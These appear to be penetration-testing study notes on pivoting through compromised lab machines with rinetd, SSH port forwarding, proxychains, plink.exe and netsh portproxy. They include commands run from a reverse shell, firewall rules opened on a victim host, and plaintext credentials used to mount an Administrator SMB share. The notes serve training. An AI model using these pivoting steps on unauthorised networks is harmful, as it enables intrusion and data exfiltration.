# Tunneling & Port Forwarding

### RINETD (use rinetd to redirect any traffic)

> In this fairly common scenario, our first target, the Linux web server, has Internet connectivity, but the second machine, the Linux client, does not. We were only able to access this client by pivoting through the Internet-connected server. In order to pivot again, this time from the Linux client, and begin assessing other machines on the internal network, we must be able to transfer tools from our attack machine and exfiltrate data to it as needed. Since this client can not reach the Internet directly, we must use the compromised Linux web server as a go-between, moving data twice and creating a very tedious data transfer process.

Check access the internet:

```sh
ping google.com -c 1
nc -nvv 216.58.207.142 80
```

> _Linux client is indeed disconnected from the Internet. In order to transfer files to an Internet-connected host, we must first transfer them to the Linux web server and then transfer them again to our intended destination. Instead, we will use a port forwarding tool called rinetd1 to redirect traffic on our Kali Linux server._

Install rinetd tool:

```sh
sudo apt update && sudo apt install rinetd
```

After install rinetd, configuration file, /etc/rinetd.conf, lists forwarding rules that require four parameters, including _bind address - bind port - connect address - connect port which define the traffic's destination address and port_

Exam: use rinetd to redirect any traffic received by the Kali web server on port 80 to the google.com IP address we used in our tests. To do this, we will edit the rinetd configuration file and specify the following forwarding rule 0.0.0.0 80 216.58.207.142 80.

Check file configuration rinetd:

```sh
cat /etc/rinetd.conf
...
# bindadress  bindport  connectaddress  connectport
0.0.0.0 80 216.58.207.142 80
...
```

Restart rinetd service

```sh
sudo service rinetd restart
```

### SSH Tunneling

#### SSH Local Port Forwarding

SSH _local port forwarding_ allows us to tunnel a local port to a remote server using SSH as the transport protocol. The effects of this technique are similar to rinetd port forwarding, with a few twists

Check config ssh local port forwarding:

```sh
cat /root/port_forwarding_and_tunneling/ssh_local_port_forwarding.sh
```

SSH Local port forwarding

```sh
sudo ssh -N -L [bind_address:]port:host:hostport [username@address]
sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 ntt@10.11.0.128
```

#### SSH Remote Port Forwarding

```sh
ssh -N -R [bind_address:]port:host:hostport [username@address]
ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
```

#### SSH Dynamic Port Forwarding

> Dynamic port forwarding allows you to create a socket on the local (ssh client) machine, which acts as a SOCKS proxy server. When a client connects to this port, the connection is forwarded to the remote (ssh server) machine, which is then forwarded to a dynamic port on the destination machine. This way, all the applications using the SOCKS proxy will connect to the SSH server, and the server will forward all the traffic to its actual destination.

Dynamic Port Forwarding

```sh
ssh -N -D [address_bind]:port_bind [username@<IP_server>]
sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
```

Modify proxychains config

```sh
cat /etc/proxychains.conf
...
[ProxyList]
socks4 127.0.0.1 8080
```

Syntax with proxychains

```sh
sudo proxychains nmap --top-port=20 -sT -Pn 192.168.1.10
```

### PLINK.exe

> Assume: we have gained access to a Windows 10 machine during our assessment through a vulnerability. We would like to scan this database or interact with the service. However, because of the firewall, we cannot directly interact with this service from our Kali machine. =>use plink.exe to connect via SSH (-ssh) to our Kali machine (10.11.0.4) as the kali user (-l kali) with a password of "ilak" (-pw ilak) to create a remote port forward (-R) of port 1234 (10.11.0.4:1234) to the MySQL port on the Windows target (127.0.0.1:3306)

```sh
plink.exe
plink.exe -ssh -l kali -pw kali -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4

#However, since this will most likely not work with the interactivity level we have in a typical reverse shell, we should pipe the answer to the prompt with the cmd.exe /c echo y command. From our reverse shell, then, this command will successfully establish the remote port forward without any interaction:
cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4

#Now that our tunnel is active, we can attempt to launch an Nmap scan of the target's MySQL port via our localhost port forward on TCP port 1234:
sudo nmap -sS -sV 127.0.0.1 -p 1234
```

### NETSH

Require:

* The windows system must have the IP Helper service running
* IPv6 support must be enabled for the interface we want to use

Example: we will use the netsh (interface) context to add an IPv4-to-IPv4 (v4tov4) proxy (portproxy) listening on 10.11.0.22 (listenaddress=10.11.0.22), port 4455 (listenport=4455) that will forward to the Windows 2016 Server (connectaddress=192.168.1.110) on port 445 (connectport=445)

Note: payload on the compromised machine

```sh
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110

#Check port 4455 is listening on the compromised windows host
netstat -anp TCP | find "4455"

#using netsh to allow inbound traffic on TCP port 4455 (default Windows Firewall will disallow inbound connection on TCP port 4455)
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow

#connect to compromised windows machine on port 4455 using smbclient
sudo nano /etc/samba/smb.conf
cat /etc/samba/smb.conf
sudo /etc/init.d/smbd restart
smbclient -L 10.11.0.22 --port=4455 --user=Administrator

sudo mkdir /mnt/win10_share
sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share
ls -l /mnt/win10_share/
cat /mnt/win10_share/data.txt
```

### HTTP Tunneling through Deep Packet Inspection

Certain deep packet content inspection devices may only allow specific protocols. If, for example, the SSH protocol is not allowed, all the tunnels that relied on this protocol would fail.
